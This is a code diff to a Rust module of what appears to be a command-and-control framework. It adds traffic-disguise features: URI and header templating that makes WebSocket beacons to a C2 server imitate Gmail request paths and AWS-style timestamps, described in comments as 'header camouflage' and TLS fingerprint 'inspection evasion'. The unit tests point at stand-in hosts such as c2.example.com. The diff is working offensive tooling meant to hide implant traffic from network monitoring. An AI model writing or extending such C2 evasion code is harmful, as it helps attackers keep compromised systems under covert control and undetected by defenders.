@@ -107,8 +107,87 @@ pub fn get_profile(name: &str) -> MalleableProfile {
     }
 }
 
+/// Expand uri_template placeholders for a single connect attempt.
+/// Supported: {session_id}, {jitter}, {bucket}, {key}, {timestamp}
+pub fn expand_uri_template(template: &str) -> String {
+    use std::time::{SystemTime, UNIX_EPOCH};
+    let session_id = format!("{:08x}", random_u32());
+    let jitter = format!("{}", (random_u32() % 900) + 100);
+    let bucket = "prod-assets";
+    let key = format!("obj/{session_id}");
+    let ts = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0);
+    let timestamp = format_amz_date(ts);
+
+    template
+        .replace("{session_id}", &session_id)
+        .replace("{jitter}", &jitter)
+        .replace("{bucket}", bucket)
+        .replace("{key}", &key)
+        .replace("{timestamp}", &timestamp)
+}
+
+fn format_amz_date(secs: u64) -> String {
+    // Minimal UTC-ish YYYYMMDDTHHMMSSZ without chrono dependency
+    // Good enough for header camouflage (not cryptographic calendar accuracy).
+    const SECS_PER_DAY: u64 = 86400;
+    let days = secs / SECS_PER_DAY;
+    let rem = secs % SECS_PER_DAY;
+    let h = rem / 3600;
+    let m = (rem % 3600) / 60;
+    let s = rem % 60;
+    // Civil date from days since 1970-01-01 (Howard Hinnant algorithm)
+    let z = days as i64 + 719468;
+    let era = if z >= 0 { z } else { z - 146096 } / 146097;
+    let doe = (z - era * 146097) as u64;
+    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
+    let y = yoe as i64 + era * 400;
+    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
+    let mp = (5 * doy + 2) / 153;
+    let d = doy - (153 * mp + 2) / 5 + 1;
+    let mth = if mp < 10 { mp + 3 } else { mp - 9 };
+    let year = if mth <= 2 { y + 1 } else { y };
+    format!(
+        "{:04}{:02}{:02}T{:02}{:02}{:02}Z",
+        year, mth, d, h, m, s
+    )
+}
+
+fn random_u32() -> u32 {
+    let mut b = [0u8; 4];
+    let _ = getrandom::getrandom(&mut b);
+    u32::from_le_bytes(b)
+}
+
+/// Rebuild base WebSocket URL so path/query come from profile.uri_template.
+/// Keeps scheme + authority from `base_url`; replaces path and query.
+/// Example: `wss://c2.example/ws` + gmail template → `wss://c2.example/mail/u/0/?sync=...`
+pub fn url_with_profile_path(base_url: &str, profile: &MalleableProfile) -> String {
+    let path = expand_uri_template(profile.uri_template);
+    let path = if path.starts_with('/') {
+        path
+    } else {
+        format!("/{path}")
+    };
+
+    // Split scheme://authority/rest
+    let without_frag = base_url.split('#').next().unwrap_or(base_url);
+    if let Some(scheme_end) = without_frag.find("://") {
+        let after_scheme = &without_frag[scheme_end + 3..];
+        let auth_end = after_scheme.find('/').unwrap_or(after_scheme.len());
+        let authority = &after_scheme[..auth_end];
+        let scheme = &without_frag[..scheme_end];
+        return format!("{scheme}://{authority}{path}");
+    }
+    // Fallback: append/replace poorly formed URLs
+    format!("{without_frag}{path}")
+}
+
 /// Apply a profile to a WebSocket request builder.
 /// Adds headers and sets user-agent to match the profile.
+/// Dynamic values like {timestamp} in header values are expanded.
 #[cfg(feature = "ws")]
 pub fn apply_profile_headers(
     profile: &MalleableProfile,
@@ -121,8 +200,9 @@ pub fn apply_profile_headers(
         }
     }
     for (k, v) in profile.headers.iter() {
+        let expanded = expand_uri_template(v);
         if let Ok(name) = header::HeaderName::from_bytes(k.as_bytes()) {
-            if let Ok(value) = v.parse() {
+            if let Ok(value) = expanded.parse() {
                 builder.headers_mut().insert(name, value);
             }
         }
@@ -130,9 +210,36 @@ pub fn apply_profile_headers(
 }
 
 /// Generate a JA3-like fingerprint for TLS ClientHello inspection evasion.
-/// This is a simplified hint; full JA3 randomization requires TLS stack control.
-/// For wss:// connections, we add randomized cipher list ordering in the
-/// connector setup (see ws.rs).
+/// This is a simplified hint; full JA3 randomization requires TLS stack control
+/// (rustls ClientConfig cipher order) — see ws.rs notes.
 pub fn get_ja3_hint(profile: &MalleableProfile) -> &'static str {
     profile.ja3_hint
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn expand_replaces_placeholders() {
+        let s = expand_uri_template("/mail/u/0/?sync={session_id}&ati={jitter}");
+        assert!(s.starts_with("/mail/u/0/?sync="));
+        assert!(!s.contains("{session_id}"));
+        assert!(!s.contains("{jitter}"));
+    }
+
+    #[test]
+    fn url_with_profile_replaces_path() {
+        let p = get_profile("gmail");
+        let u = url_with_profile_path("wss://c2.example.com:443/old/ws", &p);
+        assert!(u.starts_with("wss://c2.example.com:443/mail/u/0/"));
+        assert!(!u.contains("/old/ws"));
+    }
+
+    #[test]
+    fn default_profile_ws_path() {
+        let p = get_profile("default");
+        let u = url_with_profile_path("ws://127.0.0.1:8080/anything", &p);
+        assert_eq!(u, "ws://127.0.0.1:8080/ws");
+    }
 }
